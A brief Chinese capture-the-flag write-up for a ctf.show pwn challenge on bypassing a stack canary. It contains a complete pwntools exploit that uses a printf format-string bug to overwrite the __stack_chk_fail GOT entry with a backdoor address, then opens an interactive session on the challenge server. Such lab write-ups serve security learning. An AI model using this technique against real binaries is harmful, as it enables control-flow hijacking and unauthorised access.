# 挑战简介
Bypass Canary 姿势4

# 思路
看到printf直接确定格式化字符串，而且此题有后门函数  

payload的关键构成如下  
```
fmtstr_payload(7, {stack_chk: flag}, write_size='byte')
```

栈位置位于第七位，并且劫持stack_chk函数，使其指向后门函数并跳转  

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show', 28151)

elf = ELF('D:\edge 下载\pwn')

stack_chk = elf.got['__stack_chk_fail']

flag = 0x8048586

payload = b''

# for i in range(100):
#     payload += f'.%{i}$p'.encode()

payload = fmtstr_payload(7, {stack_chk: flag}, write_size='byte')
payload = payload.ljust(0x50, b'a')


io.sendline(payload)


io.interactive()
```
